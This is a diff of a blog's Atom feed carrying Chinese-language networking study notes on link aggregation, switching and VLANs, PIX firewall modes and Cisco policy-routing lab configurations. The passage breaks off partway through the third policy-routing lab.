+      <category term="网络设计及扩展" scheme="http://yoursite.com/tags/%E7%BD%91%E7%BB%9C%E8%AE%BE%E8%AE%A1%E5%8F%8A%E6%89%A9%E5%B1%95/"/>
+    
+      <category term="路由协议" scheme="http://yoursite.com/tags/%E8%B7%AF%E7%94%B1%E5%8D%8F%E8%AE%AE/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>链路聚合</title>
+    <link href="http://yoursite.com/2019/09/23/%E9%93%BE%E8%B7%AF%E8%81%9A%E5%90%88/"/>
+    <id>http://yoursite.com/2019/09/23/链路聚合/</id>
+    <published>2019-09-23T02:59:03.562Z</published>
+    <updated>2019-08-25T13:14:59.486Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="以太网链路聚合："><a href="#以太网链路聚合：" class="headerlink" title="以太网链路聚合："></a>以太网链路聚合：</h1><p>链路聚合又称为端口聚合，端口捆绑，英文名porttrunking。是一种聚合多个物理接口 ( that ) 创建一个逻辑接口。你可以捆扎( bundle ) 八个单独的活动链接到一个信道端口，以提供更高的带宽和冗余。端口通道也负载平衡这些物理接口上的通信量。只要端口通道中的至少一个物理接口可操作，端口通道就可以保持运行</p><h3 id="channel-group模式与说明："><a href="#channel-group模式与说明：" class="headerlink" title="channel-group模式与说明："></a>channel-group模式与说明：</h3><p>PAgP 是 Cisco私有，只能在 Cisco Switch 上设定，PAgP 有两个模式，分別是 Desirable 与 Auto当 PAgP 成功建立 EtherChannel 后，PAgP Message 会继续定时传送去维持 EtherChannel </p><hr><p>​                        Desirable      Auto</p><p>Desirable           √                  √               主动发送PAgP报文</p><p>Auto                    √                  x               被动发送PAgP报文</p><p>On                                                            手动设置，需要两边都设置</p><p><code>LACP 是 IEEE Standard</code></p><hr><p>​                            Active         Passive</p><p>Active                    √                 √             主动发送LACP报文</p><p>Passive                  √                x              主动接收LACP报文</p><hr><p>（1）Cisco最多允许EtherChannel绑定8个端口；如果是百兆网络，总带宽可达1.6Gbit/s；如果是千兆网络，总带宽可达16Gbit/s。</p><p>（2）EtherChannel不支持10M端口；</p><p>（3）EtherChannel编号只在本地有效，链路两端的编号可以不一样；</p><p>（4）EtherChannel默认使用PAgP协议；</p><p>（5）EtherChannel默认情况下是基于源MAC地址的负载平衡；</p><p>（6）一个EtherChannel内所有的端口都必须具有相同的端口速率和双工模式，LACP只能是全双工模式；</p><p>（7）channel-group接口会自动继承最小物理接口，或最先配置的接口模式；</p><p>（8）cisco的交换机不仅可以支持第二层EtherChannel,还可以支持第三层EtherChannel。</p><h3 id="配置端口聚合："><a href="#配置端口聚合：" class="headerlink" title="配置端口聚合："></a>配置端口聚合：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Switch(config)#int port-channel 1//启用编号为1的聚合端口</span><br><span class="line">Switch(config-if)#switchport mode trunk//设置端口模式为trunk</span><br><span class="line">Switch(config)#int range f0/1-2//进入物理端口</span><br><span class="line">Switch(config-if)#switchport mode trunk//设置端口模式为trunk</span><br><span class="line">Switch(config-if-range)#channel-group 1 mode on//将物理端口加入聚合端口，模式为on</span><br></pre></td></tr></table></figure><h3 id="配置端口聚合的流量均衡："><a href="#配置端口聚合的流量均衡：" class="headerlink" title="配置端口聚合的流量均衡："></a>配置端口聚合的流量均衡：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Switch(config)#int f0/1</span><br><span class="line">Switch(config-if)#spanning-tree vlan 10 port-priority 16</span><br><span class="line">Switch(config-if)#spanning-tree vlan 20 port-priority 32</span><br><span class="line">Switch(config)#int f0/2</span><br><span class="line">Switch(config-if)#spanning-tree vlan 10 port-priority 32</span><br><span class="line">Switch(config-if)#spanning-tree vlan 20 port-priority 16</span><br></pre></td></tr></table></figure>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h1 id=&quot;以太网链路聚合：&quot;&gt;&lt;a href=&quot;#以太网链路聚合：&quot; class=&quot;headerlink&quot; title=&quot;以太网链路聚合：&quot;&gt;&lt;/a&gt;以太网链路聚合：&lt;/h1&gt;&lt;p&gt;链路聚合又称为端口聚合，端口捆绑，英文名porttrunking。是一种聚合多个物理接口 (
+      
+    
+    </summary>
+    
+      <category term="系统安全" scheme="http://yoursite.com/categories/%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/"/>
+    
+    
+      <category term="网络设计及扩展" scheme="http://yoursite.com/tags/%E7%BD%91%E7%BB%9C%E8%AE%BE%E8%AE%A1%E5%8F%8A%E6%89%A9%E5%B1%95/"/>
+    
+      <category term="网络协议" scheme="http://yoursite.com/tags/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>交换机工作原理及VLAN</title>
+    <link href="http://yoursite.com/2019/09/23/%E4%BA%A4%E6%8D%A2%E6%9C%BA%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86%E5%8F%8AVLAN/"/>
+    <id>http://yoursite.com/2019/09/23/交换机工作原理及VLAN/</id>
+    <published>2019-09-23T02:59:03.559Z</published>
+    <updated>2019-09-03T06:34:51.342Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="数据链路层与交换机："><a href="#数据链路层与交换机：" class="headerlink" title="数据链路层与交换机："></a>数据链路层与交换机：</h1><h3 id="数据链路层："><a href="#数据链路层：" class="headerlink" title="数据链路层："></a>数据链路层：</h3><p>数据链路层是位于网络层与物理层之间的层次，其中，以太网就是工作在数据链路层，在数据链路层中，数据是以帧的形式传输的。</p><h3 id="以太网MAC地址："><a href="#以太网MAC地址：" class="headerlink" title="以太网MAC地址："></a>以太网MAC地址：</h3><p>以太网地址用来识别一个以太网上的某个单独的设备或一组设备，又称物理地址。</p><p>MAC地址是由<code>48位二进制数组成</code>的，以<code>十六进制数表示</code>。前24位称为OUI（组织唯一标识符），后24位是厂商对网卡的唯一编号，第8位如果是0表示单播地址，是1表示组播地址。</p><p>交换机有一个基本MAC地址，每一个端口对应一个MAC地址。</p><h3 id="以太网帧格式："><a href="#以太网帧格式：" class="headerlink" title="以太网帧格式："></a>以太网帧格式：</h3><p><img src="http://ww1.sinaimg.cn/large/006bOYmUgy1g66akwcflqj30io05zdfw.jpg" alt></p><p>类型长度：0x0800为IPv4地址，0x86DD为IPv6地址</p><p>FCS：帧校验序列</p><h3 id="MAC子层与LLC子层："><a href="#MAC子层与LLC子层：" class="headerlink" title="MAC子层与LLC子层："></a>MAC子层与LLC子层：</h3><p><strong>介质访问控制（MAC）</strong>子层（802.3）</p><p>⚫将上层交下来的数据封装成帧迚行发送(接收时迚行相反的过程，将帧拆卸)</p><p>⚫实现和维护介质访访问控制协议，例如CSMA/CD</p><p>⚫比特差错检测</p><p>⚫MAC帧的寻址，即MAC帧由哪个站（源站）收出，被哪个站／哪些站接收（目的站）</p><p><strong>逻辑链路控制（LLC）</strong>子层（802.2）</p><p>⚫建立和释放数据链路层的逻辑连接</p><p>⚫提供不上层的接口</p><p>⚫给帧加上序号</p><h3 id="以太网命名方法："><a href="#以太网命名方法：" class="headerlink" title="以太网命名方法："></a>以太网命名方法：</h3><p><code>N－信号－物理介质</code></p><p><code>N：</code>以兆位为单位的数据速率，如10、100、1000</p><p><code>信号：</code>基带还是宽带</p><p><code>物理介质：</code>标识介质类型</p><p><strong>举例：100BASE-TX</strong></p><table><thead><tr><th>类型</th><th>接口</th><th>传输介质</th><th>标准</th></tr></thead><tbody><tr><td>标准以太网</td><td>10Base-T</td><td>双绞线</td><td>IEEE 802.3</td></tr><tr><td>标准以太网</td><td>10Base5</td><td>粗同轴电缆</td><td>IEEE 802.3</td></tr><tr><td>标准以太网</td><td>10Base2</td><td>细同轴电缆</td><td>IEEE 802.3</td></tr><tr><td>快速以太网</td><td>100Base-TX</td><td>双绞线</td><td>IEEE 802.3u</td></tr><tr><td>快速以太网</td><td>100Base-FX</td><td>光纤</td><td>IEEE 802.3u</td></tr><tr><td>千兆以太网</td><td>1000Base-T</td><td>双绞线</td><td>IEEE 802.3ab、IEEE 802.3z</td></tr><tr><td>千兆以太网</td><td>1000Base-SX</td><td>多模光纤</td><td>IEEE 802.3ab、IEEE 802.3z</td></tr><tr><td>千兆以太网</td><td>1000Base-LX</td><td>单模光纤</td><td>IEEE 802.3ab、IEEE 802.3z</td></tr></tbody></table><h3 id="以太网交换机："><a href="#以太网交换机：" class="headerlink" title="以太网交换机："></a>以太网交换机：</h3><p>交换机是用来连接局域网的主要设备</p><p>交换机能够根据以太网帧中目标地址智能的转发数据，因此交换机工作在数据链路层</p><p>交换机分割冲突域，实现全双工通信</p><hr><h1 id="交换机的数据转发原理："><a href="#交换机的数据转发原理：" class="headerlink" title="交换机的数据转发原理："></a>交换机的数据转发原理：</h1><h3 id="交换机的转发原理："><a href="#交换机的转发原理：" class="headerlink" title="交换机的转发原理："></a>交换机的转发原理：</h3><p><strong>转发</strong></p><p>   交换机根据MAC地址表单播转数据帧</p><p><strong>学习</strong></p><p>   MAC地址表是交换机通过学习接收的数据帧的源MAC地址来形成的</p><p><strong>广播</strong></p><p>   如果目标地址在MAC地址表中没有，交换机就向除接收到该数据帧的端口外的其他所有端口广播该数据帧</p><p><strong>更新</strong></p><p>   交换机MAC地址表的老时间是300秒</p><p>   交换机如果发现一个帧的入端口和MAC地址表中源MAC地址的所在端口不同，交换机将MAC地址重新学习到新的端口。</p><hr><p><img src="http://ww1.sinaimg.cn/large/006bOYmUgy1g66b0qxsymj30eu078dgj.jpg" alt></p><p><strong>举例1</strong>：主机11给主机33发送一个数据帧</p><p>​    <strong>交换机A</strong>：在接收到数据帧后，执行以下操作：</p><p>​            交换机A查找MAC地址表</p><p>​            交换机A学习主机11的MAC地址</p><p>​            交换机A向其他所有端口发送广播</p><p>​    <strong>主机22</strong>：查看数据包的目标MAC地址不是自己，丢弃数据包</p><p>​    <strong>交换机B</strong>：在接收到数据帧后，执行以下操作：</p><p>​            交换机B查看MAC地址表</p><p>​            交换机B学习源MAC地址和端口号</p><p>​            交换机B向所有端口广播数据包</p><p>​    <strong>主机33</strong>：接收到数据帧</p><p>​    <strong>主机44</strong>：弃数据帧</p><p><strong><code>在这个过程中，交换机的MAC地址表中没有需要的条目，交换机通过广播方式转发了数据帧</code></strong></p><p><strong>举例2</strong>：主机44给主机11发送一个数据帧</p><p>​    <strong>交换机B</strong>：在接收到数据帧后，执行以下操作：</p><p>​        交换机B查看MAC地址表</p><p>​        交换机B学习源MAC地址和端口号</p><p>​        交换机B直接从端口1发送给交换A</p><p>​    <strong>交换机A</strong>：在接收到数据帧后，执行以下操作：</p><p>​        交换机A查找MAC地址表</p><p>​        交换机A学习源MAC地址和端口号</p><p>​        交换机A直接向11转发数据</p><p>​    <strong>主 机11</strong>：接收到数据帧 </p><p><strong><code>在这个过程中，交换机的MAC地址表中已经学到了需要的条目，交换机通过单播的方式，转发了数据帧</code></strong></p><hr><h3 id="单工、半双工、全双工："><a href="#单工、半双工、全双工：" class="headerlink" title="单工、半双工、全双工："></a>单工、半双工、全双工：</h3><p><strong>单工：</strong>只有一个信道，传输方向只能是单向的</p><p><strong>半双工：</strong>只有一个信道，在同一时刻，只能是单向传输</p><p><strong>全双工：</strong>双信道，同时可以有双向数据传输</p><h3 id="冲突、冲突域、广播域："><a href="#冲突、冲突域、广播域：" class="headerlink" title="冲突、冲突域、广播域："></a>冲突、冲突域、广播域：</h3><p>集线器所有端口在一个冲突域，如果冲突过多，则传输效率就会降低、交换机分割冲突域，因为一个接口一个冲突域。</p><p>广播域指接收同样广播消息的节点的集合，如：在该集合中的任何一个节点传输一个广播帧，则所有其他能收到这个帧的节点都认为是广播帧的一部份。</p><p>交换机分割冲突域，但是不分割广播域，即交换机的所有端口属于同一个广播域。</p><hr><h1 id="交换机的基本配置："><a href="#交换机的基本配置：" class="headerlink" title="交换机的基本配置："></a>交换机的基本配置：</h1><h3 id="交换机访问方法："><a href="#交换机访问方法：" class="headerlink" title="交换机访问方法："></a>交换机访问方法：</h3><p>一般分为本地配置和远程配置两种方式，本地配置一般采用console端口连接，远程配置方式有telnet、ssh等连接方式。</p><h3 id="端口安全："><a href="#端口安全：" class="headerlink" title="端口安全："></a>端口安全：</h3><p>指对交换机的端口进行安全属性的配置，从而控制用户的安全接入。交换机端口安全主要有两种类型</p><p>一是限制交换机端口的最大连接数，从而控制交换机端口下连接的主机数，防止用户进行恶意的ARP（地址解析协议，即<em>ARP</em>【Address Resolution Protocol】）欺骗</p><p>二是针对交换机端口执行MAC地址、IP地址的绑定，从而实现对用户的严格控制。</p><p>对安全违例的处理方式有以下3种。</p><p>​         ① protect  当安全地址个数满后，安全端口将丢弃未知名的地址包</p><p>​         ② restrict  当违例产生时，将发送一个Trap通知</p><p>​         ③ shutdown 当违例产生时，将关闭端口并发送一个Trap通知</p><p> trap，指被管理设备（代理）上报的陷阱报文，表明设备发生故障或变更的主动通知</p><p><strong>交换机端口安全功能只能在Access接口进行配置！！</strong></p><p><strong>配置实例：</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">switch&gt;enable</span><br><span class="line">switch#config terminal</span><br><span class="line">switch(config)#int loopback 0//创建环回接口</span><br><span class="line">switch(config-if)#ip address 1.1.1.1 255.255.255.0//配置环回接口地址</span><br><span class="line">switch(config)#int fastethernet 0/1</span><br><span class="line">switch(config-if)#speed 100//设置fastethernet0/1端口速率为10Mbit/s</span><br><span class="line">switch(config-if)#duplex full//设置fastethernet0/1端口为全双工</span><br><span class="line">switch(config-if)#no shutdown//启用端口</span><br><span class="line">switch(config-if)#switchport mode access//设置当前端口为Access</span><br><span class="line">Switch(config-if)#switchport port-security//打开当前端口安全功能</span><br><span class="line">Switch(config-if)#switchport port-security maximum 1//设置端口安全地址的最大个数</span><br><span class="line">Switch(config-if)#switchport port-security violation shutdown//配置处理违例的方式</span><br><span class="line">Switch(config-if)#switchport port-security mac-address 0001.C7E9.6EC0//配置安全地址</span><br><span class="line">Switch(config-if)#switchport port-security violation shutdown   //配置处理违例的方式</span><br></pre></td></tr></table></figure><hr><h1 id="VLAN概述："><a href="#VLAN概述：" class="headerlink" title="VLAN概述："></a>VLAN概述：</h1><p>VLAN（Virtual Local Area Network）的中文名为”虚拟局域网”，虚拟局域网（VLAN）是一组逻辑上的设备和用户，这些设备和用户并不受物理位置的限制，可以根据功能、部门及应用等因素将它们组织起来，相互之间的通信就好像它们在同一个网段中一样，由此得名虚拟局域网。</p><p>交换机的所有端口都在一个广播域，如果计算机数量增多会产生广播风暴。为了避免广播风暴，在交换机上可以采用<strong>虚拟局域网技术</strong>（Vlan）</p><p><strong>配置实例：</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">划分Vlan:</span><br><span class="line">Switch#config </span><br><span class="line">Switch(config)#vlan 10</span><br><span class="line"></span><br><span class="line">修改vlan名称：</span><br><span class="line">Switch(config)#vlan 40</span><br><span class="line">Switch(config-vlan)#name rsb</span><br><span class="line"></span><br><span class="line">将端口加入到vlan:</span><br><span class="line">Switch(config)#int f0/1</span><br><span class="line">Switch(config-if)#switchport mode access</span><br><span class="line">Switch(config-if)#switchport access vlan 10</span><br><span class="line"></span><br><span class="line">查看vlan配置信息：</span><br><span class="line">Switch#sh vlan brief</span><br></pre></td></tr></table></figure><hr><h1 id="VLAN间通信："><a href="#VLAN间通信：" class="headerlink" title="VLAN间通信："></a>VLAN间通信：</h1><h3 id="Trunk技术："><a href="#Trunk技术：" class="headerlink" title="Trunk技术："></a>Trunk技术：</h3><p><strong>（1）封装</strong> </p><p>​      ISL（思科私有）：是在数据帧前加26字节，尾加4字节</p><p>​      802.1Q（工业标准）：是在数据帧中插入4字节，打标签</p><p>​      802.1Q Native Vlan：默认vlan1不打标，作管理用</p><p><strong>（2）模式</strong></p><table><thead><tr><th>Mode</th><th>DTP send</th><th>DTP Response</th></tr></thead><tbody><tr><td>Access</td><td>-</td><td>-</td></tr><tr><td>Trunk</td><td>Y</td><td>Y</td></tr><tr><td>Desirable(企望)</td><td>Y</td><td>Y</td></tr><tr><td>Auto(自动)</td><td>N</td><td></td></tr><tr><td>Nonegotiate(不协商)</td><td>N</td><td>N</td></tr></tbody></table><p><strong>（3）查看trunk信息</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Switch(config-if)#switchport mode trunk</span><br><span class="line">Switch#show interfaces trunk</span><br><span class="line">Switch(config-if)# switchport trunk allowed vlan 10</span><br><span class="line">Switch(config-if)# switchport trunk native vlan1 //本征vlan</span><br></pre></td></tr></table></figure><p><strong>（4）不同vlan间通信</strong></p><p>使用三层交换机，起SVI接口，打开路由</p><p><strong>单臂路由 ：</strong></p><p>①使用三层交换机实现不同vlan间通信</p><p>​    </p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">第一步：trunk链路</span><br><span class="line">Switch(config-if)#switchport trunk encapsulation dot1q </span><br><span class="line"></span><br><span class="line">第二步：划分vlan</span><br><span class="line">Switch(config)#vlan 10</span><br><span class="line">Switch(config-vlan)#vlan 20</span><br><span class="line"></span><br><span class="line">第三步：开启SVI接口作为相应vlan客户端的网关</span><br><span class="line">Switch(config)#int vlan 10</span><br><span class="line">Switch(config-if)#ip add 192.168.10.254 255.255.255.0</span><br><span class="line">Switch(config-if)#no shutdown </span><br><span class="line">Switch(config)#int vlan 20</span><br><span class="line">Switch(config-if)#ip add 192.168.20.254 255.255.255.0</span><br><span class="line">Switch(config-if)#no shutdown</span><br><span class="line"></span><br><span class="line">第四步：开启三层交换机路由功能</span><br><span class="line">Switch(config)#ip routing   //开启三层交换机路由功能 </span><br><span class="line"></span><br><span class="line">第五步：为客户机设置网关地址</span><br></pre></td></tr></table></figure><p><strong>SVI：svi是联系vlan的ip接口，一个svi只能和一个vlan相联系</strong></p><h3 id="VTP技术："><a href="#VTP技术：" class="headerlink" title="VTP技术："></a>VTP技术：</h3><p>VTP（VLAN Trunking Protocol）：是VLAN中继协议，也被称为虚拟局域网干道协议。它是思科私有协议。作用是十几台交换机在企业网中，配置VLAN工作量大，可以使用VTP协议，把一台交换机配置成VTP Server, 其余交换机配置成VTP Client,这样他们可以自动学习到server 上的VLAN 信息。</p><p>vtp有三种模式：分别是服务器模式（Server）、客户机模式（Client）、透明模式（Transparent）</p><p>基本命令：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Switch(config)#hostname S1//设置主机名</span><br><span class="line">Switch(config)#vtp domain s1.com//设置域名</span><br><span class="line">Switch(config)#vtp mode server/client/transparent//设置模式</span><br></pre></td></tr></table></figure>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h1 id=&quot;数据链路层与交换机：&quot;&gt;&lt;a href=&quot;#数据链路层与交换机：&quot; class=&quot;headerlink&quot; title=&quot;数据链路层与交换机：&quot;&gt;&lt;/a&gt;数据链路层与交换机：&lt;/h1&gt;&lt;h3 id=&quot;数据链路层：&quot;&gt;&lt;a href=&quot;#数据链路层：&quot; class=&quot;
+      
+    
+    </summary>
+    
+      <category term="系统安全" scheme="http://yoursite.com/categories/%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/"/>
+    
+    
+      <category term="网络设计及扩展" scheme="http://yoursite.com/tags/%E7%BD%91%E7%BB%9C%E8%AE%BE%E8%AE%A1%E5%8F%8A%E6%89%A9%E5%B1%95/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>防火墙简单配置</title>
+    <link href="http://yoursite.com/2019/09/23/%E9%98%B2%E7%81%AB%E5%A2%99%E7%AE%80%E5%8D%95%E9%85%8D%E7%BD%AE/"/>
+    <id>http://yoursite.com/2019/09/23/防火墙简单配置/</id>
+    <published>2019-09-23T02:59:03.556Z</published>
+    <updated>2019-09-22T03:20:15.331Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="防火墙配置实例："><a href="#防火墙配置实例：" class="headerlink" title="防火墙配置实例："></a>防火墙配置实例：</h1><h3 id="防火墙的三种模式："><a href="#防火墙的三种模式：" class="headerlink" title="防火墙的三种模式："></a>防火墙的三种模式：</h3><p><strong>路由模式：</strong></p><p>当防火墙位于内部网络和外部网络之间时，需要将防火墙与内部网络、外部网络以及DMZ 三个区域相连的接口分别配置成不同网段的IP 地址，重新规划原有的网络拓扑，此时相当于一台路由器。</p><p>采用路由模式时，可以完成ACL 包过滤、ASPF 动态过滤、NAT 转换等功能。然而，路由模式需要对网络拓扑进行修改（内部网络用户需要更改网关、路由器需要更改路由配置等），这是一件相当费事的工作，因此在使用该模式时需权衡利弊。</p><p><strong>透明模式：</strong></p><p>如果防火墙采用透明模式进行工作，则可以避免改变拓扑结构造成的麻烦，此时防火墙对于子网用户和路由器来说是完全透明的。也就是说，用户完全感觉不到防火墙的存在。</p><p>采用透明模式时，只需在网络中像放置网桥（bridge）一样插入该防火墙设备即可，无需修改任何已有的配置。与路由模式相同，IP 报文同样经过相关的过滤检查（但是IP 报文中的源或目的地址不会改变），内部网络用户依旧受到防火墙的保护。</p><p><strong>混合模式：</strong></p><p>如果防火墙既存在工作在路由模式的接口（接口具有IP 地址），又存在工作在透明模式的接口（接口无IP 地址），则防火墙工作在混合模式下。混合模式主要用于透明模式作双机备份的情况，此时启动VRRP（Virtual Router Redundancy Protocol，虚拟路由冗余协议）功能的接口需要配置IP 地址，其它接口不配置IP地址。</p><hr><h3 id="配置实例："><a href="#配置实例：" class="headerlink" title="配置实例："></a>配置实例：</h3><p><strong>透明模式配置实例：</strong></p><p>实验拓扑：</p><p><img src="https://ws1.sinaimg.cn/large/006bOYmUgy1g783xsbh1mj30o30blmxm.jpg" alt></p><p>防火墙配置（透明模式）：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pixfirewall(config)# firewall transparent</span><br><span class="line">pixfirewall(config)# ip add 10.0.0.3 255.255.255.248</span><br><span class="line">pixfirewall(config)# int e 0</span><br><span class="line">pixfirewall(config-if)# nameif inside</span><br><span class="line">pixfirewall(config-if)# security-level 100</span><br><span class="line">pixfirewall(config-if)# no shutdown</span><br><span class="line">pixfirewall(config)# int e 1</span><br><span class="line">pixfirewall(config-if)# nameif outside</span><br><span class="line">pixfirewall(config-if)# security-level 0</span><br><span class="line">pixfirewall(config)# no shutdown</span><br><span class="line">pixfirewall(config)# access-list 110 permit icmp any any</span><br><span class="line">pixfirewall(config)# access-group 110 in interface inside</span><br><span class="line">pixfirewall(config)# access-group 110 in interface outside</span><br></pre></td></tr></table></figure><p><strong>路由模式配置实例：</strong></p><p>实验拓扑：</p><p><img src="https://ws1.sinaimg.cn/large/006bOYmUgy1g784az94drj30oa07haam.jpg" alt></p><p>防火墙配置（路由模式）：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pixfirewall(config)# int e 0</span><br><span class="line">pixfirewall(config-if)# nameif inside</span><br><span class="line">pixfirewall(config-if)# security-level 100</span><br><span class="line">pixfirewall(config-if)# ip add 10.0.0.2 255.255.255.252</span><br><span class="line">pixfirewall(config-if)# no shutdown</span><br><span class="line">pixfirewall(config)# int e 1</span><br><span class="line">pixfirewall(config-if)# nameif outside</span><br><span class="line">pixfirewall(config-if)# security-level 0</span><br><span class="line">pixfirewall(config-if)# ip add 61.1.1.1 255.255.255.0</span><br><span class="line">pixfirewall(config-if)# no shutdown</span><br><span class="line">pixfirewall(config)# route inside 192.168.1.0 255.255.255.0 10.0.0.2</span><br><span class="line">pixfirewall(config)# route outside 0.0.0.0 0.0.0.0 61.1.1.2</span><br><span class="line">pixfirewall(config)# access-list 1 permit icmp any any</span><br><span class="line">pixfirewall(config)# access-group 1 in interface outside</span><br><span class="line">pixfirewall(config)# nat (inside) 1 192.168.1.0 255.255.255.0</span><br><span class="line">pixfirewall(config)# global (outside) 1 interface</span><br></pre></td></tr></table></figure>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h1 id=&quot;防火墙配置实例：&quot;&gt;&lt;a href=&quot;#防火墙配置实例：&quot; class=&quot;headerlink&quot; title=&quot;防火墙配置实例：&quot;&gt;&lt;/a&gt;防火墙配置实例：&lt;/h1&gt;&lt;h3 id=&quot;防火墙的三种模式：&quot;&gt;&lt;a href=&quot;#防火墙的三种模式：&quot; class=&quot;he
+      
+    
+    </summary>
+    
+      <category term="系统安全" scheme="http://yoursite.com/categories/%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/"/>
+    
+    
+      <category term="防火墙" scheme="http://yoursite.com/tags/%E9%98%B2%E7%81%AB%E5%A2%99/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>策略路由</title>
+    <link href="http://yoursite.com/2019/09/23/%E7%AD%96%E7%95%A5%E8%B7%AF%E7%94%B1/"/>
+    <id>http://yoursite.com/2019/09/23/策略路由/</id>
+    <published>2019-09-23T02:59:03.553Z</published>
+    <updated>2019-09-17T03:36:11.731Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="策略路由："><a href="#策略路由：" class="headerlink" title="策略路由："></a>策略路由：</h1><p>策略路由提供了一种根据网络管理者制定的策略来进行数据包转发的机制。基于策略的路由比传统路由能力更强，使用更灵活，它使用网络管理者不仅能够根据目的地址，而且能够根据协议类型、报文大小、应用或IP源地址来选择转发路径。策略由路由映射表来定义。</p><h3 id="实验一、基于源IP地址的策略路由配置"><a href="#实验一、基于源IP地址的策略路由配置" class="headerlink" title="实验一、基于源IP地址的策略路由配置"></a>实验一、基于源IP地址的策略路由配置</h3><p><strong>实验目的：</strong></p><p>1、用route-map定义路由策略</p><p>2、在接口下应用路由策略</p><p>3、基于源IP地址的策略路由的配置和调试</p><p><strong>实验拓扑：</strong></p><p><img src="https://ws1.sinaimg.cn/large/006bOYmUgy1g72cr35esmj30m609wdg9.jpg" alt></p><p><strong>实验步骤：</strong></p><p>在路由器R1的f0/0接口应用IP策略路由CCNA，使得从主机PC2来的数据设置一跳地址为：172.16.12.2；从主机PC3来的数据设置下一跳地址为：172.16.21.2，所有其他的数据包正常转发，整个网络运行EIGRP路由协议。</p><p><code>配置ACL</code></p><p>R1(config)#access-list 1 permit 172.16.1.2</p><p>R1(config)#access-list 2 permit 172.16.1.3</p><p><code>配置路由映射表</code></p><p>R1(config)#route-map CCNA permit 10</p><p>R1(config-route-map)#match ip address 1</p><p>R1(config-route-map)#set ip next-hop 172.16.12.2</p><p>R1(config-route-map)#exit</p><p>R1(config)#route-map CCNA permit 20</p><p>R1(config-route-map)#match ip address 2</p><p>R1(config-route-map)#set ip next-hop 172.16.21.2</p><p><code>应用策略路由</code></p><p>R1(config)#int f0/0</p><p>R1(config-if)#ip policy route-map CCNA</p><p><strong>实验调试：</strong></p><p>1、查看路由路径</p><p>​    PC2#traceroute 172.16.2.2</p><p>​    PC3#traceroute 172.16.2.2</p><p>2、在R1上显示调试信息</p><p>​    R1#debug ip policy</p><p>​    PC2：ping 172.16.2.2  </p><p>​    PC6:ping 172.16.2.2</p><p>3、显示在哪些接口上应用了策略路由</p><p>​    R1#sh ip policy</p><p>4、显示定义的所有路由策略及路由策略匹配的情况</p><hr><h3 id="实验二、基于数据包长度的策略路由配置"><a href="#实验二、基于数据包长度的策略路由配置" class="headerlink" title="实验二、基于数据包长度的策略路由配置"></a>实验二、基于数据包长度的策略路由配置</h3><p><strong>实验目的：</strong></p><p>1、用route-map定义路由策略</p><p>2、在接口下应用路由策略</p><p>3、基于数据包长度的策略路由的配置和调试</p><p><strong>实验拓扑：</strong></p><p><img src="https://ws1.sinaimg.cn/large/006bOYmUgy1g72cv2jjtyj30m609wdg9.jpg" alt></p><p><strong>实验步骤：</strong></p><p>在R1的f0/0接口应用IP策略路由CCNP，使得对大小为“64-100”字节的数据包设置出接口为s1/0;数据包大小“101-100”字节的数据包设置出接口为“f0/1”,所有其他的数据包正常转发，整个网络运行EIGRP路由协议。</p><p><code>配置路由映射表</code></p><p>R1(config)#route-map CCNP permit 10</p><p>R1(config-route-map)#match length 64 100</p><p>R1(config-route-map)#set interface s1/0</p><p>R1(config)#route-map CCNP permit 20</p><p>R1(config-route-map)#match length 101 1000</p><p>R1(config-route-map)#set interface f0/1</p><p><code>应用策略路由</code></p><p>R1(config)#int f0/0</p><p>R1(config-if)#ip policy route-map CCNP</p><p>R1(config-if)#exit</p><p>R1(config)#ip local policy route-map CCNP</p><p><strong>实验调试：</strong></p><p>1.在主机上执行扩展ping命令，在R1上显示调试信息。</p><p>​    PC2：ping 172.16.2.2 repeat 1 size 90</p><p>​    PC2：ping 172.16.2.2 repeat 1 size 300</p><p>​    PC2：ping 172.16.2.2 repeat 1 size 1200</p><p>2、显示在哪些接口上应用了策略路由</p><p>​    R1#sh ip policy</p><p>3、显示定义的所有路由策略及路由策略匹配的情况</p><p>​    R1#sh route-map CCNP</p><hr><h3 id="实验三、基于应用的策略路由配置"><a href="#实验三、基于应用的策略路由配置" class="headerlink" title="实验三、基于应用的策略路由配置"></a>实验三、基于应用的策略路由配置</h3><p><strong>实验目的：</strong></p><p>1、用route-map定义路由策略</p><p>2、在接口下应用路由策略</p><p>3、基于数据包长度的策略路由的配置和调试</p><p><strong>实验拓扑：</strong></p><p><img src="https://ws1.sinaimg.cn/large/006bOYmUgy1g72cyv5zc6j30m609wdg9.jpg" alt></p><p><strong>实验步骤：</strong></p><p>在R1的f0/0接口应用IP策略路由CCIE，使得对HTTP数据包设置一跳地址为：172.16.12.2，并且设置IP数据包优先级为”flash”,为telnet数据包设置下一跳地址为：172.16.21.2，并且设置IP数据包优先级为：critical，所有其他的数据包正常转发，整个路由协议运行EIGRP。</p><p><code>配置R2的http与telnet访问</code></p><p>R2(config)#ip http server</p><p>R2(config)#line vty 0 4</p><p>R2(config-line)#no login</p><p>R2(config-line)#privilege level 15</p><p><code>配置扩展ACL</code></p><p>R1(config)#ip access-list extended HTTP</p><p>R1(config-ext-nacl)#permit tcp any any eq 